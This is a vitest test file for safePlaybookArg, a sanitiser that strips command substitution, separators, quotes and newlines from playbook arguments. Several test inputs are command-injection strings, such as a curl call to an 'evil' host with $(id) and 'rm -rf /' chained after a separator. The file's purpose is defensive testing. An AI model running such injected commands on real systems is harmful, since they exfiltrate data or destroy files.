import { describe, it, expect } from 'vitest';
import { safePlaybookArg } from '../_playbook-utils.js';

describe('safePlaybookArg — playbook command-injection fencing', () => {
  it('strips command-substitution and separators', () => {
    expect(safePlaybookArg('admin; curl https://evil/$(id)')).toBe('admin curl https://evil/id');
    expect(safePlaybookArg('a`whoami`b')).toBe('awhoamib');
    expect(safePlaybookArg('x && rm -rf / ; y')).toBe('x  rm -rf /  y');
    expect(safePlaybookArg('a|b>c<d')).toBe('abcd');
  });

  it('strips quote-breakout and escape characters (any quoting context)', () => {
    expect(safePlaybookArg('a"b\'c\\d')).toBe('abcd');
    // A value meant for a double-quoted context ("client_id=...") can't close the quote.
    expect(safePlaybookArg('id" ; curl evil #')).toBe('id  curl evil ');
  });

  it('strips newlines so a `#`-commented probe cannot be broken out of', () => {
    expect(safePlaybookArg('user\nrm -rf /')).toBe('userrm -rf /');
    expect(safePlaybookArg('a\r\nb\tc')).toBe('abc');
  });

  it('keeps ordinary identifier / ARN / region / repo / URL characters', () => {
    expect(safePlaybookArg('arn:aws:iam::123456789012:user/alice')).toBe('arn:aws:iam::123456789012:user/alice');
    expect(safePlaybookArg('us-east-1')).toBe('us-east-1');
    expect(safePlaybookArg('octocat/hello-world')).toBe('octocat/hello-world');
    expect(safePlaybookArg('https://graph.microsoft.com/.default')).toBe('https://graph.microsoft.com/.default');
    expect(safePlaybookArg('my.user+tag@example.com')).toBe('my.user+tag@example.com');
  });

  it('keeps spaces (at worst an extra arg to the same command, never a new command)', () => {
    expect(safePlaybookArg('openid profile email')).toBe('openid profile email');
  });

  it('handles null/undefined', () => {
    expect(safePlaybookArg(undefined)).toBe('');
    expect(safePlaybookArg(null)).toBe('');
  });
});
